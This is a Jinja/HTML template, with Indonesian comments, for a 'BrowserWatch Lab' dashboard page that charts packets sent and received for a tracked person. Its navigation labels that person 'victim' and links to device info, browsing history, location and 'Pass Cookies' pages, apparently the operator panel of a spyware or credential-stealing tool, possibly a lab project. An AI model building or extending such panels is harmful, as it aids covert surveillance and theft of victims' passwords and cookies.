<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BrowserWatch Lab Dashboard</title>
    <link rel="stylesheet" href="/static/network.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
</head>
<body>
    <div class="container">
        <div class="sidebar">
            <div class="admin-profile">
                <div class="profile-image">
                    <img src="/static/image/admin-profil.jpg" alt="Admin Profile">
                </div>
                <h2>{{ victim.username }}</h2>
            </div>
            
            <nav class="sidebar-nav">
                <a class="nav-item" href="/overview?id={{ victim.id }}">Overview</a>
                <a class="nav-item" href="/device?id={{ victim.id }}">Device Info</a>
                <a class="nav-item" href="/history?id={{ victim.id }}">History</a>
                <a class="nav-item active" href="/network?id={{ victim.id }}">Network</a>
                <a class="nav-item" href="/location?id={{ victim.id }}">Location</a>
                <a class="nav-item" href="/passcookies?id={{ victim.id }}">Pass Cookies</a>
            </nav>
            
            <div class="logout-section">
                <a href="/victim" class="logout-btn">
                    <img src="/static/image/logout-icon.png" alt="Logout Icon" class="logout-icon">
                    Back
                </a>
            </div>
        </div>

        <main class="main-content">
            <div class="content-header">
                <h1 class="page-title">Network Traffic</h1>
            </div>

            <!-- Grafik Network -->
            <div class="chart-container">
                <canvas id="networkChart"></canvas>
            </div>

            <div class="scale-info">
                <p>Data yang ditampilkan dalam grafik telah dikalikan dengan faktor <strong>{{ scale_factor }}</strong> (1.000). Angka sebenarnya adalah hasil perkalian dengan faktor ini.</p>
            </div>
        </main>
    </div>

    <script>
    var networkData = JSON.parse('{{ network_data | tojson | safe }}');
    console.log("Network Data Received:", networkData);  // Debugging untuk melihat data yang diterima

    var labels = [networkData.created_at];  // Menggunakan waktu sebagai label
    var packetsSent = [networkData.packets_sent];
    var packetsReceived = [networkData.packets_recv];

    // Debugging data untuk memastikan semuanya sudah sesuai
    console.log("Labels:", labels);
    console.log("Packets Sent:", packetsSent);
    console.log("Packets Received:", packetsReceived);

    const ctx = document.getElementById('networkChart').getContext('2d');

    const data = {
        labels: labels,
        datasets: [
            {
                label: 'Packet Sent',
                data: packetsSent,
                borderColor: '#4A90E2',
                backgroundColor: '#4A90E2',
                fill: false,
                tension: 0.3,
                pointRadius: 5  // Membuat titik lebih besar agar terlihat
            },
            {
                label: 'Packet Received',
                data: packetsReceived,
                borderColor: '#8B4513',
                backgroundColor: '#8B4513',
                fill: false,
                tension: 0.3,
                pointRadius: 5  // Membuat titik lebih besar agar terlihat
            }
        ]
    };

    const config = {
        type: 'line',  // Grafik jenis garis
        data: data,
        options: {
            animation: {
                duration: 1500,  // Durasi animasi grafik
            },
            scales: {
                y: {
                    beginAtZero: true  // Memulai sumbu Y dari 0
                }
            },
            elements: {
                point: {
                    radius: 5  // Mengatur ukuran titik jika hanya ada satu titik data
                }
            }
        }
    };

    new Chart(ctx, config);  // Menampilkan grafik
</script>



</body>
</html>
